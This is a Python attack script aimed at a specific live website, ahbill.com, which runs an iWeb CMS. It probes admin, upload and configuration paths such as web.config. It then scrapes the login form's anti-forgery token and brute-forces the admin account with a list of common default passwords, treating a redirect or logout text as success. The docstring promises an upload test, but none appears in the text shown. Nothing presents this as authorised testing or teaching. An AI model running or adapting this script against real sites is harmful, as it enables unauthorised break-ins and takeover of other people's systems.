#!/usr/bin/env python3
"""ahbill iWeb CMS: vuln probe + weak creds + upload test"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://ahbill.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, headers=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# 1. iWeb known paths
print("=== iWeb paths ===")
op, cj = get_opener()
for p in ["/admin/login.html", "/admin/", "/api/upload", "/UploadFile/", "/web.config",
          "/admin/home.html", "/diyform/", "/Admin/User/List", "/admin/user"]:
    code, body = fetch(op, HOST + p)
    print("  %s: %s size=%d" % (p, code, len(body)))

# 2. login page token + weak brute
print("\n=== login attempt ===")
code, body = fetch(op, HOST + "/admin/login.html")
m = re.search(r'__RequestVerificationToken[^>]*value="([^"]+)"', body)
token = m.group(1) if m else ""
print("token: %s" % token[:30] if token else "NO TOKEN")
for pw in ["admin", "admin123", "123456", "admin888", "iweb123", "a123456"]:
    op2, cj2 = get_opener()
    code, body = fetch(op2, HOST + "/admin/login.html")
    m = re.search(r'__RequestVerificationToken[^>]*value="([^"]+)"', body)
    t = m.group(1) if m else ""
    data = urllib.parse.urlencode({"UserName": "admin", "Password": pw, "submit": "login",
                                   "__RequestVerificationToken": t})
    code, body = fetch(op2, HOST + "/admin/login.html?ReturnUrl=%2fadmin%2f", data=data,
                       headers={"Referer": HOST + "/admin/login.html"})
    ok = code == 302 or "dashboard" in body.lower() or "退出" in body or "logout" in body.lower()
    print("  admin/%s: code=%s ok=%s size=%d" % (pw, code, ok, len(body)))
